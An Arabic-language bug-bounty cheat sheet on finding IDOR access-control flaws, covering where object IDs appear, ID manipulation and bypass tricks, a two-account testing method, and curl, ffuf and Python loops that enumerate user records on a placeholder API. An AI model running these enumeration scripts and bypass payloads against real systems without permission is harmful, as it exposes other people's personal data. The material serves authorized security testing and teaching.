<a id="-idor---insecure-direct-object-reference"></a>
# 🔓 IDOR — مرجع مباشر غير آمن إلى كائن

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗██████╗  ██████╗ ██████╗ 
  ██║██╔══██╗██╔═══██╗██╔══██╗
  ██║██║  ██║██║   ██║██████╔╝
  ██║██║  ██║██║   ██║██╔══██╗
  ██║██████╔╝╚██████╔╝██║  ██║
  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝
   Insecure Direct Object Reference
```

يعرض الشعار اسم IDOR، أي المرجع المباشر غير الآمن إلى كائن.

<p align="center">
  <img src="https://img.shields.io/badge/IDOR-Access_Control-red?style=for-the-badge" alt="IDOR">
  <img src="https://img.shields.io/badge/BOLA-Authorization-blue?style=for-the-badge" alt="BOLA">
  <img src="https://img.shields.io/badge/Bug_Bounty-green?style=for-the-badge" alt="Bug Bounty">
</p>

---

<a id="-table-of-contents"></a>
## 📋 جدول المحتويات

- [ما هي ثغرة IDOR؟](#-what-is-idor)
- [أين تبحث؟](#-where-to-look)
- [أنواع المعرفات وتعديلها](#-id-types--manipulation)
- [تقنيات تجاوز التحقق](#-bypass-techniques)
- [منهجية الاختبار](#-testing-methodology)
- [الأدوات والأتمتة](#-tools--automation)

---

<a id="-what-is-idor"></a>
## 🎯 ما هي ثغرة IDOR؟

تحدث **IDOR** عندما يتيح التطبيق مراجع مباشرة إلى كائنات داخلية، مثل سجلات قاعدة البيانات أو الملفات، دون التحقق الصحيح من صلاحية المستخدم للوصول إليها.

<a id="impact"></a>
### الأثر
- 🔴 **سرقة البيانات** — الوصول إلى بيانات مستخدمين آخرين
- 🔴 **رفع الصلاحيات** — الوصول إلى وظائف الإدارة
- 🔴 **الاستيلاء على الحساب** — تعديل حسابات الآخرين
- 🔴 **التلاعب بالبيانات** — حذف السجلات أو تعديلها

<a id="idor-vs-bola"></a>
### مقارنة IDOR مع BOLA

أصلحنا صفًا ناقص الخلية في جدول الأصل لعرض التسمية الكاملة لـ BOLA تحت عمودها.
|IDOR|BOLA|
|------|------|
|المصطلح التقليدي|مصطلح مستخدم في أمن API|
| — | خلل التفويض على مستوى الكائنات (Broken Object Level Authorization) |

---

<a id="-where-to-look"></a>
## 🔍 أين تبحث؟

<a id="url-parameters"></a>
### معلمات URL
```
/user/profile?id=123
/api/users/123
/download?file=report_123.pdf
/account/settings/123
/orders/view/123
```

<a id="postput-body"></a>
### جسم طلب POST/PUT
```json
{
  "user_id": 123,
  "account_id": 123,
  "order_id": 123
}
```

<a id="headers"></a>
### الترويسات
```http
X-User-ID: 123
X-Account-ID: 123
Cookie: user_id=123
```

<a id="common-parameters"></a>
### معلمات شائعة
```
id, user_id, uid, account_id, aid
profile_id, pid, order_id, oid
doc_id, document_id, file_id
invoice_id, transaction_id, ref
customer_id, cid, member_id
```

<a id="common-endpoints"></a>
### نقاط نهاية شائعة
```
/api/users/{id}
/api/orders/{id}
/api/invoices/{id}
/api/documents/{id}
/api/messages/{id}
/download/{id}
/files/{id}
/profile/{id}
/settings/{id}
```

---

<a id="-id-types--manipulation"></a>
## 🔢 أنواع المعرفات وتعديلها

<a id="sequential-ids"></a>
### معرفات متسلسلة

> **توضيح:** قابلية تخمين المعرف ليست شرطًا وحيدًا للحكم على IDOR؛ حتى المعرفات المعقدة تحتاج إلى فحص تفويض على مستوى الكائن. تغيير المعرف أو معرفة قيمته لا يثبت الثغرة دون وصول غير مسموح. [دليل OWASP للوقاية](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html).
```
# النمط الأكثر شيوعًا بحسب الأصل: زيادة القيمة أو إنقاصها
/api/users/1
/api/users/2
/api/users/3

# اختبار القيم الحدية
/api/users/0
/api/users/-1
/api/users/9999999
```

<a id="uuids"></a>
### UUIDs
```
# فحص كيفية توليد المعرفات ومدى قابليتها للتوقع
550e8400-e29b-41d4-a716-446655440000
550e8400-e29b-41d4-a716-446655440001  # زيادة الجزء الأخير

# البحث عن أنماط
# معرفات UUID الزمنية v1 قد تتضمن معلومات قابلة للتوقع
# معرفات UUID العشوائية v4 أصعب في التخمين
```

<a id="encoded-ids"></a>
### معرفات مرمزة

> **تصحيح للمثال:** يضيف `echo` افتراضيًا محرف سطر جديد؛ لذلك فإن `echo "123" | base64` يعطي `MTIzCg==` لا `MTIz`، ومثال `124` يعطي `MTI0Cg==`. احتُفظ بأسطر الأصل حرفيًا. [دليل GNU لـ echo](https://www.gnu.org/s/coreutils/manual/html_node/echo-invocation.html).
```
# Base64
echo "123" | base64  → MTIz
echo "124" | base64  → MTI0

# اختبار المعرفات المرمزة
/api/users/MTIz  → decode = 123
/api/users/MTI0  → decode = 124

# ترميز ست عشري
123 → 7b
124 → 7c
```

<a id="hashed-ids"></a>
### معرفات مبنية على قيم التجزئة (Hashes)
```
# قيمة MD5 للمعرف
/user/202cb962ac59075b964b07152d234b70  → md5(123)

# تجربة خوارزميات مختلفة
# فحص ما إذا كانت قيمة التجزئة مشتقة من المعرف أو عشوائية
```

<a id="custom-formats"></a>
### صيغ مخصصة
```
# معرفات ذات بادئة
/user/USR_123
/order/ORD_456
/doc/DOC_789

# معرفات مبنية على الطابع الزمني
/file/20240128_001
/file/20240128_002
```

---

<a id="-bypass-techniques"></a>
## 🛡️ تقنيات تجاوز التحقق

<a id="parameter-manipulation"></a>
### تعديل المعلمات
```bash
# الأصل
GET /api/users/123

# صيغ بديلة
GET /api/users/124
GET /api/users/123,124
GET /api/users/123%00124
GET /api/users/[123,124]
GET /api/users?id=123&id=124
```

<a id="http-method-change"></a>
### تغيير أسلوب HTTP
```bash
# إذا منع GET، فاختبر الأساليب الأخرى
GET /api/users/124     → Blocked
POST /api/users/124    → Allowed?
PUT /api/users/124     → Allowed?
```

<a id="wrap-in-arraysobjects"></a>
### تغليف المعرف في مصفوفات أو كائنات
```json
// إذا منع id=124، فاختبر:
{"id": [124]}
{"id": {"$eq": 124}}
{"ids": [123, 124]}
```

<a id="encoding-bypass"></a>
### اختبار تجاوز التحقق بالترميز
```
# ترميز URL
/api/users/12%34  → 124
/api/users/%31%32%34  → 124

# ترميز مزدوج
/api/users/%2531%2532%2534  → 124

# محارف Unicode
/api/users/１２４  → Full-width 124
```

<a id="case-manipulation"></a>
### تغيير حالة الأحرف
```bash
/API/USERS/124
/Api/Users/124
/api/Users/124
```

<a id="path-traversal-combo"></a>
### الدمج مع اجتياز المسارات (Path Traversal)
```
/api/users/123/../124
/api/users/./124
/api/users/123/../../users/124
```

<a id="null-byte"></a>
### البايت الصفري (Null Byte)
```
/api/users/124%00
/api/users/124%00.json
/api/users/124\x00
```

<a id="json-parameter-injection"></a>
### حقن معلمات JSON
```json
// الطلب الأصلي
{"user_id": 123, "action": "view"}

// الطلب المعدل للاختبار
{"user_id": 124, "action": "view"}
{"user_id": "123\",\"target_id\": \"124", "action": "view"}
```

<a id="hpp-http-parameter-pollution"></a>
### تكرار معلمات HTTP ‏(HTTP Parameter Pollution أو HPP)
```
/api/user?id=123&id=124
/api/user?id=123&ID=124
/api/user?user_id=123&userid=124
```

---

<a id="-testing-methodology"></a>
## 📋 منهجية الاختبار

<a id="step-1-identify"></a>
### الخطوة 1: تحديد المواضع
```
1. احصر جميع نقاط النهاية التي تستخدم مراجع إلى كائنات
2. سجل جميع المعلمات التي تبدو كمعرفات
3. أنشئ حسابي اختبار: المستخدم A والمستخدم B
```

<a id="step-2-enumerate"></a>
### الخطوة 2: استكشاف المعرفات
```
1. سجل معرفاتك أثناء الدخول بالمستخدم A
2. سجل معرفاتك أثناء الدخول بالمستخدم B
3. حدد أنماط المعرفات
```

<a id="step-3-test"></a>
### الخطوة 3: الاختبار
```
1. أثناء الدخول بالمستخدم A، اختبر الوصول إلى كائنات المستخدم B
2. اختبر عمليات الإنشاء والقراءة والتحديث والحذف (CRUD):
   - القراءة (GET)
   - الإنشاء (POST)
   - التحديث (PUT/PATCH)
   - الحذف (DELETE)
```

<a id="step-4-escalate"></a>
### الخطوة 4: اختبار نطاق صلاحيات أعلى
```
1. اختبر معرفات الإدارة؛ يذكر الأصل أمثلة 1 وadmin و0
2. اختبر القيم الخاصة null وundefined و*
3. ادرس الدمج مع ثغرات أخرى
```

<a id="checklist"></a>
### قائمة تحقق
```markdown
- [ ] معلمات URL
- [ ] معلمات جسم طلب POST
- [ ] الترويسات، بما فيها ملفات تعريف الارتباط والترويسات المخصصة
- [ ] حقول النماذج المخفية
- [ ] نقاط نهاية API
- [ ] تنزيل الملفات
- [ ] وظائف التصدير
- [ ] وظائف الحذف
- [ ] وظائف الإدارة
```

---

<a id="-tools--automation"></a>
## 🛠️ الأدوات والأتمتة

<a id="burp-suite-extensions"></a>
### إضافات Burp Suite
```
- Autorize للكشف الآلي عن مشكلات التحكم بالوصول
- AuthMatrix
- Auto Repeater
```

<a id="autorize-setup"></a>
### إعداد Autorize
```
1. ثبّت إضافة Autorize
2. انسخ ملف تعريف ارتباط جلسة المستخدم B
3. أضفه إلى Autorize
4. تصفح بهوية المستخدم A
5. تعيد Autorize الاختبار باستخدام جلسة المستخدم B
```

<a id="manual-testing-with-curl"></a>
### الاختبار اليدوي باستخدام curl
```bash
# رمز وصول المستخدم A
TOKEN_A="user_a_jwt_token"

# محاولة الوصول إلى مورد المستخدم B
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/users/124

# تكرار الطلب على المعرفات
for i in {1..100}; do
  curl -s -H "Authorization: Bearer $TOKEN_A" \
       "https://api.target.com/users/$i" | grep -q "email" && echo "IDOR: $i"
done
```

<a id="ffuf-for-idor"></a>
### استخدام ffuf لاختبار IDOR
```bash
# معرفات رقمية
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w <(seq 1 1000) \
     -mc 200

# باستخدام قائمة كلمات
ffuf -u https://api.target.com/users/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -w ids.txt \
     -mc 200 -fc 403,404
```

<a id="python-script"></a>
### برنامج نصي بلغة Python

> **توضيح للتحقق:** رمز HTTP 200 أو وجود كلمة `email`، كما في أمثلة الأتمتة، مؤشرات أولية وليسا إثبات IDOR. يلزم تأكيد ملكية الكائن للمستخدم الآخر وغياب التفويض الصحيح مع مقارنة حسابي الاختبار. [منهج OWASP لاختبار IDOR](https://wstg.owasp.org/v4.2/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References/).
```python
import requests

base_url = "https://api.target.com/users/"
headers = {"Authorization": "Bearer USER_A_TOKEN"}
my_id = 123

for i in range(1, 1000):
    if i == my_id:
        continue
    r = requests.get(f"{base_url}{i}", headers=headers)
    if r.status_code == 200:
        print(f"[IDOR] Accessible: {i}")
        print(r.json())
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="common-vulnerable-functions"></a>
### وظائف شائعة قد تتأثر
|الوظيفة|الخطر|
|----------|------|
|عرض ملف شخصي|تسرب البيانات|
|تنزيل ملف|الوصول إلى الملفات|
|حذف عنصر|فقدان البيانات|
|تحديث الإعدادات|الاستيلاء على الحساب|
|عرض الطلبات|انتهاك الخصوصية|
|تصدير البيانات|سرقة بيانات على نطاق واسع|

<a id="what-to-report"></a>
### ما الذي يذكر في التقرير؟
```markdown
## ثغرة IDOR في الملف الشخصي للمستخدم

**نقطة النهاية:** GET /api/users/{id}

**الخطوات:**
1. سجل الدخول بالمستخدم A ذي المعرف 123
2. أرسل الطلب GET /api/users/124
3. لاحظ إعادة بيانات المستخدم B

**الأثر:** يستطيع أي مستخدم مسجل الدخول الوصول إلى
المعلومات الشخصية لجميع المستخدمين الآخرين بحسب نطاق المثال.

**إثبات المفهوم (PoC):**
curl -H "Authorization: Bearer [token]" \
     https://api.target.com/users/124
```

---

<a id="-pro-tips"></a>
## 💡 نصائح عملية

1. **استخدم حسابين** — اختبر المقارنة دائمًا بحسابين
2. **افحص جميع الأساليب** — GET وPOST وPUT وDELETE
3. **ابحث في جميع المواضع** — URL وجسم الطلب والترويسات وملفات تعريف الارتباط
4. **اختبر القيم الحدية** — 0 و-1 وnull وundefined
5. **ادرس ترابط الثغرات** — IDOR + CSRF وIDOR + XSS
6. **افحص وظائف التصدير** — ملفات PDF وCSV ضمن الوظائف التي يوصي الأصل بفحصها
7. **افحص واجهات تطبيقات الهاتف** — يصفها الأصل بأنها قد تكون أقل أمنًا؛ يلزم تقييم كل واجهة وفق أدلتها

---

<a id="-resources"></a>
## 📚 الموارد

- [دليل OWASP حول IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [دليل HackTricks حول IDOR](https://book.hacktricks.xyz/pentesting-web/idor)
- [التحكم بالوصول لدى PortSwigger](https://portswigger.net/web-security/access-control/idor)

---

<p align="center">
  <b>🔓 اكتشف ثغرات IDOR!</b><br>
  <i>للاختبارات المصرح بها فقط!</i>
</p>
